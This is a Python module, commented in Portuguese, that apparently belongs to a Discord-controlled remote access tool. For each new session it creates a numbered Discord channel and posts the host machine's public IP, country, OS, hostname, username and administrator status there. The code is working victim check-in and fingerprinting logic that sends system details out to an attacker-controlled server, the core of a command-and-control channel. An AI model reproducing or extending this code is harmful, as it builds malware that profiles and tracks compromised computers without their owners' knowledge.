# Gerenciador de sessões, responsável pela criação e gerenciamento de canais de sessão
# Início: 01/05/2025 | Última atualização: 01/05/2025

import discord
import re
import platform
import os
import time
import ctypes

from commands.get_ip_info import get_ip_info

async def create_session(client, guild_id, session_prefix):
    try:
        guild = discord.utils.get(client.guilds, id=guild_id)
        if not guild:
            print(f"[!] Erro: Não foi possível encontrar o servidor com ID {guild_id}")
            return None
            
        next_number = get_next_channel_number(guild, session_prefix)
        channel_name = f"{session_prefix}{next_number}"
        
        channel = await guild.create_text_channel(channel_name)
        print(f"[+] Canal criado com sucesso: {channel_name}")
        
        client.session_info["channel_id"] = channel.id
        client.session_info["start_time"] = time.time()
        
        await send_session_info(client, channel)
        
        return channel
        
    except Exception as e:
        print(f"[!] Erro ao criar sessão: {str(e)}")
        return None

def get_next_channel_number(guild, session_prefix):
    channel_names = [ch.name for ch in guild.text_channels if ch.name.startswith(session_prefix)]

    numbers = []
    for name in channel_names:
        match = re.search(rf"{session_prefix}(\d+)", name)
        if match:
            try:
                numbers.append(int(match.group(1)))
            except ValueError:
                continue
    
    return max(numbers) + 1 if numbers else 1

async def send_session_info(client, channel):
    try:
        ip, flag = get_ip_info()
        os_info = f"{platform.system()} {platform.release()}"
        user = os.getlogin()
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        hostname = platform.node()
        
        admin_icon = " | :gem:" if is_admin else ""
        
        msg = (
            f"@here :white_check_mark: Nova sessão iniciada `{channel.name}` | "
            f"{os_info} | Hostname: `{hostname}` | {ip} :flag_{flag.lower()}: | "
            f"Usuário: `{user}`{admin_icon} | "
            f"Tempo online: <t:{int(time.time())}:R>"
        )
        
        await channel.send(msg)
        
    except Exception as e:
        print(f"[!] Erro ao enviar informações de sessão: {str(e)}")